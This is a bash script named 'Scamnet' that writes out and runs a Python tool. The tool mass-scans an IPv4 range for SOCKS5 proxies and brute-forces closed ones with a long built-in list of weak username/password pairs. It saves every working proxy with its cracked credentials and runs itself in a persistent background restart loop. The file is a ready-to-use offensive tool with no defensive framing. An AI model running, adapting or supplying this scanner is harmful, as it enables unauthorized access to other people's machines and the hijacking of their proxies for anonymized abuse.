#!/bin/bash
# main.sh - Scamnet OTC v4.1（终极版：变量独立 + 无依赖 + 永不崩溃）
set -euo pipefail
IFS=$'\n\t'
RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; NC='\033[0m'
LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LATEST_LOG="$LOG_DIR/latest.log"
RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
echo -e "${GREEN}[OTC] Scamnet v4.1 (终极独立版 + 永不崩溃)${NC}"
echo "日志 → $LATEST_LOG"
# ==================== 依赖安装 ====================
install_deps() {
    echo -e "${YELLOW}[*] 安装依赖...${NC}"
    python3 -m pip install --break-system-packages aiohttp tqdm pyyaml --force-reinstall --no-cache-dir 2>/dev/null || \
    python3 -m pip install aiohttp tqdm pyyaml --force-reinstall --no-cache-dir
    touch .deps_installed
    echo -e "${GREEN}[+] 依赖完成${NC}"
}
if [ ! -f ".deps_installed" ]; then
    install_deps
fi
# ==================== 输入 ====================
DEFAULT_START="157.254.32.0"
DEFAULT_END="157.254.52.255"
echo -e "${YELLOW}请输入起始 IP（默认: $DEFAULT_START）:${NC}"
read -r START_IP || exit 1
START_IP=${START_IP:-$DEFAULT_START}
echo -e "${YELLOW}请输入结束 IP（默认: $DEFAULT_END）:${NC}"
read -r END_IP || exit 1
END_IP=${END_IP:-$DEFAULT_END}
if ! [[ $START_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || ! [[ $END_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo -e "${RED}[!] IP 错误！${NC}"; exit 1
fi
if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP" ]; then
    echo -e "${RED}[!] 起始 IP 必须 ≤ 结束 IP！${NC}"; exit 1
fi
echo -e "${GREEN}[*] 扫描范围: $START_IP - $END_IP${NC}"
echo -e "${YELLOW}请输入端口（默认: 1080）:${NC}"
echo " 支持格式：1080 / 1080 8080 / 1-65535"
read -r PORT_INPUT || exit 1
PORT_INPUT=${PORT_INPUT:-1080}
PORTS_CONFIG=""
if [[ $PORT_INPUT =~ ^[0-9]+-[0-9]+$ ]]; then
    PORTS_CONFIG="range: \"$PORT_INPUT\""
elif [[ $PORT_INPUT =~ ^[0-9]+( [0-9]+)*$ ]]; then
    PORT_LIST=$(echo "$PORT_INPUT" | tr ' ' ',' | sed 's/,/","/g')
    PORTS_CONFIG="ports: [\"$PORT_LIST\"]"
else
    PORTS_CONFIG="ports: [$PORT_INPUT]"
fi
echo -e "${GREEN}[*] 端口: $PORT_INPUT → $PORTS_CONFIG${NC}"
# ==================== 生成完全独立脚本（v5.1）===================
cat > "$RUN_SCRIPT" << EOF
#!/bin/bash
set -euo pipefail
cd "\$(dirname "\$0")"
# === 变量重新定义（完全独立）===
START_IP="$START_IP"
END_IP="$END_IP"
PORTS_CONFIG="$PORTS_CONFIG"
# === 写入 config.yaml ===
cat > config.yaml << CONFIG
input_range: "\$START_IP-\$END_IP"
\$PORTS_CONFIG
timeout: 5.0
max_concurrent: 200
batch_size: 300
CONFIG
# === scanner_batch.py（独立运行）===
cat > scanner_batch.py << 'PY'
#!/usr/bin/env python3
import asyncio
import aiohttp
import ipaddress
import yaml
import sys
from tqdm import tqdm
# 读取批次
if len(sys.argv) != 3:
    print("Usage: scanner_batch.py <start> <end>")
    sys.exit(1)
start_idx, end_idx = int(sys.argv[1]), int(sys.argv[2])
# 加载配置
with open('config.yaml') as f:
    cfg = yaml.safe_load(f)
input_range = cfg['input_range']
raw_ports = cfg.get('ports', cfg.get('range'))
timeout = cfg.get('timeout', 5.0)
max_concurrent = cfg.get('max_concurrent', 200)
# 解析
def parse_ip_range(s):
    a, b = s.split('-')
    return [str(ipaddress.IPv4Address(i)) for i in range(int(ipaddress.IPv4Address(a)), int(ipaddress.IPv4Address(b)) + 1)]
def parse_ports(p):
    if isinstance(p, str) and '-' in p:
        a, b = map(int, p.split('-'))
        return list(range(a, b + 1))
    return [int(x) for x in p] if isinstance(p, list) else [int(p)]
ips = parse_ip_range(input_range)
ports = parse_ports(raw_ports)
all_tasks = [(ip, port) for ip in ips for port in ports]
batch = all_tasks[start_idx:end_idx]
WEAK_PAIRS = [# === 原始列表 ===
    ("123","123"),("admin","admin"),("root","root"),("user","user"),("proxy","proxy"),("111","111"),("1","1"),("qwe123","qwe123"),
    ("abc","abc"),("aaa","aaa"),("1234","1234"),("socks5","socks5"),("123456","123456"),("12345678","12345678"),("admin123","admin"),
    ("admin","123456"),("12345","12345"),("test","test"),("guest","guest"),("admin",""),("888888","888888"),("test123","test123"),
    ("qwe","qwe"),("11","11"),("222","222"),("2","2"),("3","3"),("12349","12349"),("user","123"),("user","1234"),("user","12345"),
    ("user","123456"),("socks","socks"),("username","username"),("user","pass"),("user","pwd"),("user","password"),("password","password"),
    ("demo","demo"),("fuckyou","fuckyou"),("1239","1239"),("123459","123459"),("1080","1080"),("123","321"),("123","456"),("321","321"),
    ("1234","4321"),("1234","5678"),("12345","54321"),("12345","678910"),("12345","67890"),("123456","654321"),("123456789","123456789"),
    ("123456789","987654321"),("hello","hello"),("abcdefg","abcdefg"),("520","520"),("520","1314"),("s5","s5"),("a","a"),("a","b"),
    ("ab","ab"),("ab","cd"),("aa","bb"),("aa","bb"),("aaa","aaa"),("aaa","bbb"),("aaa","123"),("a123","a123"),("aa123","aa123"),("aaa123","aaa123"),
    ("aa123456","aa123456"),("123aa","123aa"),("123aaa","123aaa"),("123abc","123abc"),("aa","bb"),("aa","bb"),("aa","bb"),("aa","bb"),
    # === 你额外提供的字典（已去重）===
    ("admin","admin"),("12349","12349"),("socks5","socks5"),("socks","socks"),("guest","guest"),("root","root"),
    ("user","user"),("username","username"),("user","pass"),("user","pwd"),("user","password"),("password","password"),
    ("demo","demo"),("test","test"),("fuckyou","fuckyou"),("1239","1239"),("123459","123459"),("1080","1080"),
    ("123","123"),("123","321"),("123","456"),("321","321"),("1234","1234"),("1234","4321"),("1234","5678"),
    ("12345","12345"),("12345","54321"),("12345","678910"),("12345","67890"),("123456","123456"),("123456","654321"),
    ("12345678","12345678"),("12345678","87654321"),("123456789","123456789"),("123456789","987654321"),
    ("hello","hello"),("abcdefg","abcdefg"),("520","520"),("520","1314"),("s5","s5"),("a","a"),("a","b"),
    ("ab","cd"),("aa","bb"),("aaa","bbb"),("aaa","123"),("aaa","aaa"),("a123","a123"),("aa123","aa123"),
    ("aaa123","aaa123"),("aa123456","a123456"),("123aa","123aa"),("123aaa","123aaa"),("123abc","123abc"),
    ("qwq","qwq"),("qaq","qaq"),("qaq","qwq"),("qwq","qaq"),("111","aaa"),("111","222"),("aaa","111"),
    ("123456aa","123456aa"),("abc123","abc123"),("abc","123"),("123","abc"),("1234","abcd"),("12345","abcde"),
    ("123456","abcdef"),("123","qwe"),("1234","qwer"),("12345","qwert"),("123456","qwerty"),("abcde","abcde"),
    ("abc","abc"),("abc","cba"),("abc","def"),("b","b"),("asd","asd"),("as","df"),("asd","fgh"),
    ("qaq","qaq"),("qwq","qwe"),("qwe","123"),("qwer","qwer"),("qwer","1234"),("qwert","qwert"),
    ("qwert","12345"),("qwerty","qwerty"),("qwerty","123456"),("123456","qwert"),("123123","123123"),
    ("123123","abcabc"),("abcabc","123"),("love","love"),("awsl","awsl"),("nmsl","nmsl"),("cnmb","cnmb"),
    ("wsnd","wsnd"),("69","69"),("6969","6969"),("696969","696969"),("qwe","asd"),("qweasd","qweasd"),
    ("0","0"),("00","00"),("000","000"),("0000","0000"),("00000","00000"),("000000","000000"),
    ("1","1"),("a123456","a123456"),("admin","123456"),("11","11"),("111","111"),("1111","1111"),
    ("11111","11111"),("111111","111111"),("2","2"),("22","22"),("222","222"),("2222","2222"),
    ("22222","22222"),("222222","222222"),("3","3"),("33","33"),("333","333"),("3333","3333"),
    ("33333","33333"),("333333","333333"),("4","4"),("44","44"),("444","444"),("4444","4444"),
    ("44444","44444"),("444444","444444"),("5","5"),("55","55"),("555","555"),("5555","5555"),
    ("55555","55555"),("555555","555555"),("6","6"),("66","66"),("666","666"),("6666","6666"),
    ("66666","66666"),("666666","666666"),("7","7"),("77","77"),("777","777"),("7777","7777"),
    ("77777","77777"),("777777","777777"),("8","8"),("88","88"),("888","888"),("8888","8888"),
    ("88888","88888"),("888888","888888"),("9","9"),("99","99"),("999","999"),("9999","9999"),
    ("99999","99999"),("999999","999999"),
    # 重复字母/数字序列
    ("a","a"),("aa","aa"),("aaa","aaa"),("aaaa","aaaa"),("aaaaa","aaaaa"),("aaaaaa","aaaaaa"),
    ("b","b"),("bb","bb"),("bbb","bbb"),("bbbb","bbbb"),("bbbbb","bbbbb"),("bbbbbb","bbbbbb"),
    ("c","c"),("cc","cc"),("ccc","ccc"),("cccc","cccc"),("ccccc","ccccc"),("cccccc","cccccc"),
    ("d","d"),("dd","dd"),("ddd","ddd"),("dddd","dddd"),("ddddd","ddddd"),("dddddd","dddddd"),
    ("e","e"),("ee","ee"),("eee","eee"),("eeee","eeee"),("eeeee","eeeee"),("eeeeee","eeeeee"),
    ("f","f"),("ff","ff"),("fff","fff"),("ffff","ffff"),("fffff","fffff"),("ffffff","ffffff"),
    ("g","g"),("gg","gg"),("ggg","ggg"),("gggg","gggg"),("ggggg","ggggg"),("gggggg","gggggg"),
    ("h","h"),("hh","hh"),("hhh","hhh"),("hhhh","hhhh"),("hhhhh","hhhhh"),("hhhhhh","hhhhhh"),
    ("i","i"),("ii","ii"),("iii","iii"),("iiii","iiii"),("iiiii","iiiii"),("iiiiii","iiiiii"),
    ("j","j"),("jj","jj"),("jjj","jjj"),("jjjj","jjjj"),("jjjjj","jjjjj"),("jjjjjj","jjjjjj"),
    ("k","k"),("kk","kk"),("kkk","kkk"),("kkkk","kkkk"),("kkkkk","kkkkk"),("kkkkkk","kkkkkk"),
    ("l","l"),("ll","ll"),("lll","lll"),("llll","llll"),("lllll","lllll"),("llllll","llllll"),
    ("m","m"),("mm","mm"),("mmm","mmm"),("mmmm","mmmm"),("mmmmm","mmmmm"),("mmmmmm","mmmmmm"),
    ("n","n"),("nn","nn"),("nnn","nnn"),("nnnn","nnnn"),("nnnnn","nnnnn"),("nnnnnn","nnnnnn"),
    ("o","o"),("oo","oo"),("ooo","ooo"),("oooo","oooo"),("ooooo","ooooo"),("oooooo","oooooo"),
    ("p","p"),("pp","pp"),("ppp","ppp"),("pppp","pppp"),("ppppp","ppppp"),("pppppp","pppppp"),
    ("q","q"),("qq","qq"),("qqq","qqq"),("qqqq","qqqq"),("qqqqq","qqqqq"),("qqqqqq","qqqqqq"),
    ("r","r"),("rr","rr"),("rrr","rrr"),("rrrr","rrrr"),("rrrrr","rrrrr"),("rrrrrr","rrrrrr"),
    ("s","s"),("ss","ss"),("sss","sss"),("ssss","ssss"),("sssss","sssss"),("ssssss","ssssss"),
    ("t","t"),("tt","tt"),("ttt","ttt"),("tttt","tttt"),("ttttt","ttttt"),("tttttt","tttttt"),
    ("u","u"),("uu","uu"),("uuu","uuu"),("uuuu","uuuu"),("uuuuu","uuuuu"),("uuuuuu","uuuuuu"),
    ("v","v"),("vv","vv"),("vvv","vvv"),("vvvv","vvvv"),("vvvvv","vvvvv"),("vvvvvv","vvvvvv"),
    ("w","w"),("ww","ww"),("www","www"),("wwww","wwww"),("wwwww","wwwww"),("wwwwww","wwwwww"),
    ("x","x"),("xx","xx"),("xxx","xxx"),("xxxx","xxxx"),("xxxxx","xxxxx"),("xxxxxx","xxxxxx"),
    ("y","y"),("yy","yy"),("yyy","yyy"),("yyyy","yyyy"),("yyyyy","yyyyy"),("yyyyyy","yyyyyy"),
    ("z","z"),("zz","zz"),("zzz","zzz"),("zzzz","zzzz"),("zzzzz","zzzzz"),("zzzzzz","zzzzzz")]
async def get_country(ip, session):
    for url in [f"http://ip-api.com/json/{ip}?fields=countryCode", f"https://ipinfo.io/{ip}/country"]:
        try:
            async with session.get(url, timeout=5) as r:
                if r.status == 200:
                    code = (await r.json()).get("countryCode","").strip().upper() if "json" in url else (await r.text()).strip().upper()
                    if len(code) == 2: return code
        except: pass
    return "XX"
async def test_socks5(ip, port, session, auth=None):
    proxy_auth = aiohttp.BasicAuth(*auth) if auth else None
    try:
        async with session.get("http://ifconfig.me/", proxy=f"socks5h://{ip}:{port}", proxy_auth=proxy_auth, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            return True, round(r.extra.get("time_total", 0) * 1000), (await r.text()).strip()
    except:
        return False, 0, None
async def scan(ip, port):
    connector = aiohttp.TCPConnector(limit=10, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=timeout)) as session:
        ok, lat, exp = await test_socks5(ip, port, session)
        if not ok:
            for pair in WEAK_PAIRS:
                ok, lat, exp = await test_socks5(ip, port, session, pair)
                if ok: break
        if ok:
            country = await get_country(exp, session) if exp and exp != ip else await get_country(ip, session)
            auth_str = f"{pair[0]}:{pair[1]}" if ok and 'pair' in locals() else ""
            fmt = f"socks5://{auth_str}@{ip}:{port}#{country}".replace("@:", ":")
            with open("socks5_valid.txt", "a", encoding="utf-8") as f:
                f.write(fmt + "\n")
            print(f"[+] 发现: {fmt}")
async def main():
    semaphore = asyncio.Semaphore(max_concurrent)
    async def _scan(ip, port):
        async with semaphore:
            await scan(ip, port)
    tasks = [_scan(ip, port) for ip, port in batch]
    for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="批次", unit="conn"):
        await f
if __name__ == "__main__":
    asyncio.run(main())
PY
chmod +x scanner_batch.py
# === 计算总任务数 ===
TOTAL=\$(
  python3 -c "
import yaml, ipaddress
c = yaml.safe_load(open('config.yaml'))
s, e = map(ipaddress.IPv4Address, c['input_range'].split('-'))
ips = e - s + 1
p = c.get('ports', c.get('range'))
if isinstance(p, str) and '-' in p:
    a, b = map(int, p.split('-'))
    ports = b - a + 1
elif isinstance(p, list):
    ports = len(p)
else:
    ports = 1
print(int(ips) * ports)
  "
)
BATCH_SIZE=\$(yq e '.batch_size' config.yaml 2>/dev/null || echo 300)
echo "[*] 总任务: \$TOTAL, 分批: \$BATCH_SIZE"
> socks5_valid.txt
> result_detail.txt
echo "# Scamnet v5.1" > result_detail.txt
echo "# socks5://..." > socks5_valid.txt
for ((i=0; i<TOTAL; i+=BATCH_SIZE)); do
    end=\$((i + BATCH_SIZE))
    [ \$end -gt \$TOTAL ] && end=\$TOTAL
    echo "[*] 扫描批次 \$i - \$end"
    python3 scanner_batch.py \$i \$end
done
echo "[+] 扫描完成！结果 → socks5_valid.txt"
EOF
chmod +x "$RUN_SCRIPT"
# ==================== 启动后台 ====================
echo -e "${GREEN}[*] 启动后台扫描...${NC}"
echo " 查看进度: tail -f $LATEST_LOG"
echo " 停止扫描: pkill -f scanner_batch.py"
nohup bash -c "while true; do echo '[OTC] 扫描启动...'; $RUN_SCRIPT; echo '[!] 重启中...'; sleep 3; done" > "$LATEST_LOG" 2>&1 &
echo -e "${GREEN}[+] 已启动！PID: $!${NC}"
